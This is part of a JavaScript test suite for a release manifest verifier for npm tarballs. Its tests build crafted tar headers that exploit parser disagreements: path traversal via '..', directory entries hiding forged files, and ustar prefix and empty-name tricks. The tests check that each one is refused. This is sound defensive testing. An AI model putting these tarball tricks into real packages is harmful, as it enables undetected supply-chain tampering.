      `(E) a pax size preceding another header must be refused; got ${sizeBeforeHeader.code}`,
    );
    assert.match(
      sizeBeforeHeader.err,
      /precedes another header/i,
      `(E) the refusal must name it: ${sizeBeforeHeader.err}`,
    );

    // (i) the ustar magic gates the prefix field. A ustar header may split a long path across `name`
    // and `prefix`, but node-tar reads `prefix` only when the magic is exactly `ustar\0` + `00`;
    // under GNU's `ustar  \0` it takes `name` alone. This is the cheapest tamper of the whole set —
    // ONE header rewritten IN PLACE, nothing added, removed or reordered, every digest byte-identical
    // — and a reader that read the prefix unconditionally would name the entry exactly as recorded
    // while the installer wrote it to the package root.
    const splitWithGnuMagic = (block) => {
      const out = Buffer.from(block);
      const head = out.subarray(0, 512);
      const full = head.subarray(0, 100).toString('utf8').replace(/\0.*$/s, '');
      const cut = full.indexOf('/');
      head.fill(0, 0, 100);
      head.write(full.slice(cut + 1), 0, 'utf8'); // name = the tail
      head.fill(0, 345, 500);
      head.write(full.slice(0, cut), 345, 'utf8'); // prefix = the head
      head.write('ustar  \0', 257, 'binary'); // GNU magic, not the exact ustar form
      head.fill(0x20, 148, 156);
      let sum = 0;
      for (const byte of head) sum += byte;
      head.fill(0, 148, 156);
      head.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'utf8');
      return out;
    };
    ship([base[0], splitWithGnuMagic(base[1]), ...base.slice(2)]);
    const gnuMagic = verify(fx);
    assert.notEqual(
      gnuMagic.code,
      0,
      `(E) a prefix field under non-ustar magic must be refused; got ${gnuMagic.code}`,
    );
    assert.match(
      gnuMagic.err,
      /prefix field without the ustar magic/i,
      `(E) the refusal must name it: ${gnuMagic.err}`,
    );

    // (c) a `..` segment that passes `startsWith('package/')` but escapes it once resolved.
    ship([...base, tarEntry('package/../evil.js', Buffer.from('x\n'))]);
    const escaped = verify(fx);
    assert.notEqual(
      escaped.code,
      0,
      `(E) a path escaping package/ must be refused; got ${escaped.code}`,
    );
    assert.match(escaped.err, /escapes package\//i, `(E) the refusal must name it: ${escaped.err}`);

    // The same escape as a DIRECTORY entry. Directories are skipped — they carry no content — but
    // skipping is not a reason to stop looking: the path rules apply to every entry, so the one
    // entry type this reader does not hash cannot also be the one it does not check.
    ship([...base, tarEntry('package/../evil/', Buffer.alloc(0), '5')]);
    const escapedDir = verify(fx);
    assert.notEqual(
      escapedDir.code,
      0,
      `(E) a DIRECTORY escaping package/ must be refused too; got ${escapedDir.code}`,
    );
    assert.match(
      escapedDir.err,
      /escapes package\//i,
      `(E) the refusal must name it: ${escapedDir.err}`,
    );
    console.log(
      'ok (E) — pax headers: refused where the readers disagree, read where a packer writes one',
    );
  }

  // ── (Y) one package, two tarballs — the closure is ambiguous, so generation refuses ────────────
  {
    const fx = fixture();
    // A stray copy of one member, the shape a re-pack or a download leaves behind. Both declare the
    // same name, so a run that tolerated it would record the package twice and verification would
    // key by name and let one of the two silently decide the answer.
    copyFileSync(
      join(fx.tarDir, tarballName('@rayspec/spec')),
      join(fx.tarDir, 'rayspec-spec-1.6.2 (1).tgz'),
    );
    const r = run(fx, ['--tarballs', fx.tarDir]);
    assert.notEqual(r.code, 0, `(Y) a duplicated package must refuse; got ${r.code}: ${r.out}`);
    assert.match(
      r.err,
      /both declare @rayspec\/spec/,
      `(Y) the refusal must name the package and both files: ${r.err}`,
    );
    console.log('ok (Y) — two tarballs for one package refuse instead of picking one');
  }

  // ── (O) a value-taking flag with no value refuses, instead of writing the default ───────────────
  {
    const fx = fixture();
    const r = run(fx, ['--tarballs', fx.tarDir, '--out']);
    assert.notEqual(r.code, 0, `(O) --out with no value must refuse; got ${r.code}: ${r.out}`);
    assert.match(r.err, /--out requires a value/, `(O) the refusal must name the flag: ${r.err}`);
    assert.equal(
      existsSync(join(fx.root, 'packages/app/rayspec', MANIFEST_NAME)),
      false,
      '(O) a mistyped command must not write the manifest to the default path anyway',
    );
    console.log('ok (O) — a flag that takes a value says so when it does not get one');
  }

  // ── (S) the recorded digests are the ones the manifest ADVERTISES ──────────────────────────────
  {
    const fx = fixture();
    const generated = generate(fx);
    const launcher = entryFor(generated.manifest, '@rayspec/spec'); // any member with an integrity
    const tgz = readFileSync(join(fx.tarDir, tarballName('@rayspec/spec')));

    // Recomputed here, not read from the script: the manifest's single most externally-checkable
    // promise is that `openssl dgst -sha512 -binary <tgz> | openssl base64 -A` reproduces this
    // value. Without this arm the label and the algorithm can drift apart — swapping sha512 for
    // sha256 inside integrity() while keeping the `sha512-` prefix left every other case green.
    const expected = `sha512-${createHash('sha512').update(tgz).digest('base64')}`;
    assert.equal(
      launcher.tarball.integrity,
      expected,
      '(S) tarball.integrity must be the sha512 the manifest says it is',
    );
    assert.ok(
      launcher.tarball.integrity.startsWith('sha512-'),
      '(S) and it must carry the algorithm label it was computed with',
    );

    // The same for a source digest: sha256 of the file, per `algorithms.source_file_digest`.
    const schema = generated.manifest.schemas[0];
    const onDisk = readFileSync(join(fx.root, schema.path));
    assert.equal(
      schema.sha256,
      createHash('sha256').update(onDisk).digest('hex'),
      '(S) a schema digest must be the sha256 of the file it names',
    );
    console.log('ok (S) — the digests reproduce from the algorithms the manifest names');
  }

  // ── (A) a changed source artifact fails verification against its own checkout ───────────────────
  {
    const fx = fixture();
    const generated = generate(fx);
    // The tarballs are untouched and the checkout is exactly the one the manifest names — the only
    // thing wrong is a digest the manifest RECORDS for a checked-in artifact. That is the failure
    // this half exists for: a manifest that does not describe the commit it claims. (Editing the
    // artifact instead would move HEAD and make the comparison skip itself, which is by design.)
    const doctored = JSON.parse(readFileSync(generated.path, 'utf8'));
    doctored.schemas[0].sha256 = 'f'.repeat(64);
    writeFileSync(generated.path, `${JSON.stringify(doctored, null, 2)}\n`);
    const r = verify(fx);
    assert.notEqual(r.code, 0, `(A) an edited source artifact must fail; got ${r.code}: ${r.out}`);
    assert.match(
      r.out + r.err,
      /version-1\.0\.schema\.json/,
      `(A) the failure must name the artifact that moved: ${r.err || r.out}`,
    );
    console.log('ok (A) — the source half of verification is real, not decorative');
  }

  // ── (H) entries hidden inside a body no installer reads ────────────────────────────────────────
  {
    const fx = fixture();
    generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const base = memberFiles(launcher).map(([p, b]) => tarEntry(p, Buffer.from(b)));
    const ship = (blocks) =>
      writeFileSync(
        join(fx.tarDir, tarballName(LAUNCHER)),
        gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)])),
      );
    // The payload is a COMPLETE entry replacing a file the launcher really ships.
    const forged = tarEntry(
      'package/dist/index.js',
      Buffer.from("export const name = 'FORGED';\n"),
    );

    // (a) a type-5 DIRECTORY whose header declares a body. tar gives a directory no body at all —
    // node-tar zeroes the size and parses what follows as the next ENTRIES, installing them
    // (last writer wins, so the forged copy is what lands). A reader that believed the declared
    // size would consume those bytes as opaque content and record NOTHING for them: the file list
    // is unchanged, every digest still matches, and the launcher's own files are attacker-chosen.
    // This is the one shape in this file that substitutes CONTENT rather than misplacing it.
    ship([...base, tarEntry('package/.pkg-meta/', forged, '5', forged.length)]);
    const dirBody = verify(fx);
    assert.notEqual(
      dirBody.code,
      0,
      `(H) a directory declaring a body must be refused; got ${dirBody.code}`,
    );
    assert.match(
      dirBody.err,
      /directory entry declares/i,
      `(H) the refusal must name it: ${dirBody.err}`,
    );

    // (b) the same trick wearing the older costume: a REGULAR entry whose name ends in '/'.
    // node-tar reclassifies it as a directory (and so zeroes its size); a reader that took it at
    // face value would hash a file nobody installs and swallow the entries behind it.
    ship([...base, tarEntry('package/.pkg-meta/', forged, '0', forged.length)]);
    const slashName = verify(fx);
    assert.notEqual(
      slashName.code,
      0,
      `(H) a trailing-slash entry declaring a body must be refused; got ${slashName.code}`,
    );
    assert.match(
      slashName.err,
      /directory entry declares/i,
      `(H) a trailing-slash name is a directory here too: ${slashName.err}`,
    );

    // (c) a prefix field ending in '/', where the two readers join prefix and name differently.
    const prefixSlash = Buffer.from(base[1]);
    prefixSlash.fill(0, 0, 100);
    prefixSlash.write('index.js', 0, 'utf8');
    prefixSlash.fill(0, 345, 500);
    prefixSlash.write('package/dist/', 345, 'utf8');
    prefixSlash.fill(0x20, 148, 156);
    let sum = 0;
    for (const byte of prefixSlash.subarray(0, 512)) sum += byte;
    prefixSlash.fill(0, 148, 156);
    prefixSlash.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'utf8');
    ship([base[0], prefixSlash, ...base.slice(2)]);
    const trailingPrefix = verify(fx);
    assert.notEqual(
      trailingPrefix.code,
      0,
      `(H) a prefix ending in '/' must be refused; got ${trailingPrefix.code}`,
    );
    // (d) an EMPTY prefix with a non-zero byte 475. node-tar's two prefix branches are asymmetric:
    // above that byte it reads 155 bytes and prepends `prefix + '/'` UNCONDITIONALLY, below it
    // reads 130 and prepends only a non-empty one. So an empty prefix in the wide branch makes the
    // path ABSOLUTE, and an installer's strip eats the empty leading component — the file lands a
    // level deeper. A reader that prepended only-when-non-empty would name it exactly as recorded.
    // Byte 475 sits at offset 130 INSIDE the prefix field, so no packer can produce this shape: a
    // real prefix of 130 chars or fewer leaves a NUL there, and a longer one leaves the field
    // non-empty.
    const absolutePath = Buffer.from(base[1]);
    absolutePath.fill(0, 345, 500);
    absolutePath[475] = 0x41;
    absolutePath.fill(0x20, 148, 156);
    let absSum = 0;
    for (const byte of absolutePath.subarray(0, 512)) absSum += byte;
    absolutePath.fill(0, 148, 156);
    absolutePath.write(`${absSum.toString(8).padStart(6, '0')}\0 `, 148, 'utf8');
    ship([base[0], absolutePath, ...base.slice(2)]);
    const wideEmpty = verify(fx);
    assert.notEqual(
      wideEmpty.code,
      0,
      `(H) an empty prefix in the wide branch must not name the entry as recorded; got ${wideEmpty.code}`,
    );

    // (e) an EMPTY name field with a prefix. node-tar classifies file-vs-directory from the name
    // FIELD before the prefix is joined, so an empty field stays a FILE: the joined path keeps a
    // trailing slash, extraction strips it, and a 0-byte file lands at the prefix's path. A reader
    // that classified from the JOINED name would see a directory and skip it, recording nothing —
    // so aiming the prefix at a file the package really ships empties that file while every digest
    // stays identical. Measured on the real launcher: dist/bin.js went from 893 bytes to 0 with no
    // tar warning at all, and verification stayed green.
    const namelessOverwrite = Buffer.alloc(512);
    namelessOverwrite.write('0000644\0', 100, 'utf8');
    namelessOverwrite.write('0000000\0', 108, 'utf8');
    namelessOverwrite.write('0000000\0', 116, 'utf8');
    namelessOverwrite.write(`${(0).toString(8).padStart(11, '0')}\0`, 124, 'utf8');
    namelessOverwrite.write(`${(0).toString(8).padStart(11, '0')}\0`, 136, 'utf8');
    namelessOverwrite.fill(0x20, 148, 156);
    namelessOverwrite.write('0', 156, 'utf8');
    Buffer.from([0x75, 0x73, 0x74, 0x61, 0x72, 0x00, 0x30, 0x30]).copy(namelessOverwrite, 257);
    namelessOverwrite.write('package/dist/index.js', 345, 'utf8'); // aimed at a file the fixture ships
    let nameSum = 0;
    for (const byte of namelessOverwrite) nameSum += byte;
    namelessOverwrite.fill(0, 148, 156);
    namelessOverwrite.write(`${nameSum.toString(8).padStart(6, '0')}\0 `, 148, 'utf8');
    ship([...base, namelessOverwrite]);
    const nameless = verify(fx);
    assert.notEqual(
      nameless.code,
      0,
      `(H) an entry with an empty name field must be refused; got ${nameless.code}`,
    );
    assert.match(
      nameless.err,
      /name field is empty/i,
      `(H) the refusal must name it: ${nameless.err}`,
    );

    console.log('ok (H) — a body no installer reads cannot hide entries from this reader');
  }

  // ── (Q) the documented release sequence, run twice ─────────────────────────────────────────────
  {
    const fx = fixture();
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const manifestPath = join(fx.root, 'packages/app/rayspec', MANIFEST_NAME);
    // Step 2 of the sequence: the pack ships whatever the launcher directory holds — `files` says so.
    const pack = () =>
      writeFileSync(
        join(fx.tarDir, tarballName(LAUNCHER)),
        tarball(
          memberFiles(launcher, {
            extra: existsSync(manifestPath)
              ? [[`package/${MANIFEST_NAME}`, readFileSync(manifestPath)]]
              : [],
          }),
        ),
      );

    pack();
    const firstRun = generate(fx);
    const firstVerify = verify(fx);
    assert.equal(
      firstVerify.code,
      0,
      `(Q) release 1 must verify; got ${firstVerify.code}: ${firstVerify.err}`,
    );

    // Release 2. A re-pack legitimately moves some tarball bytes (pnpm rewrites `workspace:*` into
    // the packed manifest without a stable key order), so the manifest release 2 writes can never
    // equal the one release 1 left behind.
    const victim = MEMBERS.find((m) => m.name === '@rayspec/core');
    writeFileSync(
      join(fx.tarDir, tarballName(victim.name)),
      tarball(memberFiles(victim), { level: 1 }),
    );

    // (a) skipping step 1's removal: the pack carries release 1's manifest. Refuse, and say why.
    pack();
    const stale = run(fx, ['--tarballs', fx.tarDir]);
    assert.equal(
      stale.code,
      2,
      `(Q) a stale packed manifest must refuse; got ${stale.code}: ${stale.out}`,
    );
    assert.match(
      stale.err,
      new RegExp(MANIFEST_NAME),
      `(Q) the refusal must name the file: ${stale.err}`,
    );
    assert.match(stale.err, /re-pack/i, `(Q) the refusal must name the remedy: ${stale.err}`);
    assert.ok(
      readFileSync(manifestPath).equals(firstRun.bytes),
      '(Q) a refusal must write nothing — the previous manifest stays as it was',
    );

    // (b) following it: remove, re-pack, generate, verify.
    rmSync(manifestPath);
    pack();
    const secondRun = generate(fx);
    assert.ok(
      !secondRun.bytes.equals(firstRun.bytes),
      '(Q) release 2 must record the tarballs it was generated from, not the previous run',
    );
    const secondVerify = verify(fx);
    assert.equal(
      secondVerify.code,
      0,
      `(Q) release 2 must verify; got ${secondVerify.code}: ${secondVerify.err}`,
    );
    console.log(
      'ok (Q) — the release sequence is green on every run, and loud when a step is skipped',
    );
  }

  // ── (N) an absent tag and an absent workflow run are explicit nulls with reasons ───────────────
  {
    const bare = generate(fixture()).manifest;
    assert.equal(bare.source.tag.commit, null, '(N) an absent tag must not be given a commit');
    assert.equal(
      bare.source.tag.state,
      'absent',
      `(N) the state must say so: ${bare.source.tag.state}`,
    );
    assert.ok(bare.source.tag.note, '(N) an absent tag must carry a reason');
    assert.equal(bare.workflow_run.value, null, '(N) no Actions environment means no workflow run');
    assert.ok(
      bare.workflow_run.reason,
      '(N) an absent workflow run must carry a machine-readable reason',
    );

    const tagged = fixture({ tags: [`v${VERSION}`] });
    const withRun = generate(tagged, [], {
      env: {
        GITHUB_ACTIONS: 'true',
        GITHUB_SERVER_URL: 'https://github.test',
        GITHUB_REPOSITORY: 'rayspec-labs/rayspec',
        GITHUB_WORKFLOW: 'CI',
        GITHUB_RUN_ID: '4242',
        GITHUB_RUN_ATTEMPT: '2',
      },
    }).manifest;
    assert.equal(
      withRun.source.tag.state,
      'at-head',
      '(N) an annotated tag on HEAD must be recorded',
    );
    assert.equal(withRun.source.tag.commit, tagged.head, '(N) the tag must record its commit');
    assert.equal(withRun.workflow_run.reason, null, '(N) a recorded workflow run needs no reason');
    assert.equal(withRun.workflow_run.value.run_id, '4242', '(N) the run id must be recorded');
    assert.equal(
      withRun.workflow_run.value.url,
      'https://github.test/rayspec-labs/rayspec/actions/runs/4242/attempts/2',
      `(N) the run must be addressable: ${withRun.workflow_run.value.url}`,
    );
    console.log('ok (N) — what does not exist is recorded as null with a reason, never invented');
  }

  // ── (W) a modified tracked file is recorded, with its path ─────────────────────────────────────
  {
    const fx = fixture();
    assert.equal(generate(fx).manifest.source.worktree_clean, true, '(W) a clean tree must say so');
    writeFileSync(join(fx.root, 'pnpm-lock.yaml'), 'edited after the tag\n');
    const dirty = generate(fx).manifest;
    assert.equal(
      dirty.source.worktree_clean,
      false,
      '(W) a modified tracked file must be recorded',
    );
    assert.deepEqual(
      dirty.source.dirty_paths,
      ['pnpm-lock.yaml'],
      `(W) the modified path must be named: ${JSON.stringify(dirty.source.dirty_paths)}`,
    );
    console.log('ok (W) — a dirty working tree is recorded, not smoothed over');
  }

  // ── (G) git cannot answer whether the tree is clean — refuse, never claim the flattering value ─
  {
    const fx = fixture();
    // A `required` clean filter whose binary is absent (a missing git-lfs is the everyday form):
    // `git diff --name-only HEAD` exits 128 while `git rev-parse HEAD` still succeeds. A failed
    // command produces no output, and no output is also what a clean tree looks like.
    writeFileSync(join(fx.root, '.gitattributes'), 'pnpm-lock.yaml filter=unavailable\n');
    gitIn(fx.root, 'config', 'filter.unavailable.clean', 'rayspec-no-such-filter-binary');
    gitIn(fx.root, 'config', 'filter.unavailable.required', 'true');
    writeFileSync(join(fx.root, 'pnpm-lock.yaml'), 'edited after the tag\n');
    const r = run(fx, ['--tarballs', fx.tarDir]);
    assert.equal(r.code, 2, `(G) an unreadable working tree must refuse; got ${r.code}: ${r.out}`);
    assert.match(
      r.err,
      /working tree/i,
      `(G) the refusal must name what could not be read: ${r.err}`,
    );
    assert.ok(
      !existsSync(join(fx.root, 'packages/app/rayspec', MANIFEST_NAME)),
      '(G) a refusal must write no manifest at all',
    );
    console.log('ok (G) — a git failure is not a clean tree, and is not written down as one');
  }

  // ── (C) a tarball directory that is not a closure refuses ──────────────────────────────────────
  {
    const fx = fixture({ only: ['rayspec', '@rayspec/cli', '@rayspec/core'] });
    const r = run(fx, ['--tarballs', fx.tarDir]);
    assert.notEqual(r.code, 0, `(C) an incomplete closure must refuse; got ${r.code}: ${r.out}`);
    assert.match(r.err, /@rayspec\/spec/, `(C) the missing package must be named: ${r.err}`);
    console.log('ok (C) — a directory missing a dependency is not a closure and is refused');
  }

  console.log('\nrelease identity manifest: ALL CASES PASSED');
} finally {
  for (const d of workspaces) rmSync(d, { recursive: true, force: true });
}
